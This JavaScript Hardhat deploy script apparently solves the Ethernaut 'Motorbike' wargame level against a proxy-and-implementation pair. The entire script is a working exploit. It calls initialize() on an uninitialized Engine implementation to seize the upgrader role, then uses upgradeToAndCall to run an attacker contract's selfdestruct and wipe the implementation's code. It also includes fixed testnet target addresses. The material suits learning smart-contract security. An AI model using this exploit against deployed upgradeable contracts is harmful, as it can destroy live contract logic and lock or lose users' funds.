const { network, ethers } = require("hardhat")
const { networkConfig, developmentChains, generateGateKey } = require("../helper-hardhat-config")

module.exports = async ({ getNamedAccounts, deployments }) => {
    const { deploy, log } = deployments
    let deployer, player
    const chainId = network.config.chainId

    player = (await getNamedAccounts()).deployer
    let engineDirect

    log(`== PlayerAddress=${player}`)

    if (developmentChains.includes(network.name)) {
        // On localhost, deploy the contract using the 2nd account
        deployer = (await getNamedAccounts()).user
        const engineDeployment = await deploy("Engine", {
            from: deployer,
            args: [],
            log: true,
        })

        const argsProxy = [engineDeployment.address]
        const proxyDeployment = await deploy("Motorbike", {
            from: deployer,
            args: argsProxy,
            log: true,
        })

        engineDirect = await ethers.getContractAt("Engine", engineDeployment.address, player)
    } else {
        const testnetContractAddress = "0x3DA78924750fccc3773c6AAE861ccE69E1dD0bBe"
        const testnetEngineAddress = "0x289a15255d1174D311f287710f01bB016F0199c8"
        proxy = await ethers.getContractAt("Motorbike", testnetContractAddress, player)
        engineDirect = await ethers.getContractAt("Engine", testnetEngineAddress, player)
    }

    const engineSolverDeployment = await deploy("EngineSolver", {
        from: player,
        args: [],
        log: true,
    })
    const engineSolver = await ethers.getContractAt("EngineSolver", engineSolverDeployment.address, player)

    const engineDirectUpgraderBefore = await engineDirect.upgrader()
    log(`Engine Direct Upgrader Before: ${engineDirectUpgraderBefore}`)
    await (await engineDirect.initialize()).wait(1)

    const engineDirectUpgraderAfter = await engineDirect.upgrader()
    log(`Engine Direct Upgrader After: ${engineDirectUpgraderAfter}`)

    // Trigger selfdesctruct on the engine direct address by calling upgradeToAndCall()
    const txAttack = await engineSolver.populateTransaction["attack"]()
    await engineDirect.upgradeToAndCall(engineSolver.address, txAttack.data)

    const codeAfter = await ethers.provider.getCode(engineDirect.address)
    log(`Engine Direct Code After: ${codeAfter}`)
}

module.exports.tags = ["all", "motorbike"]
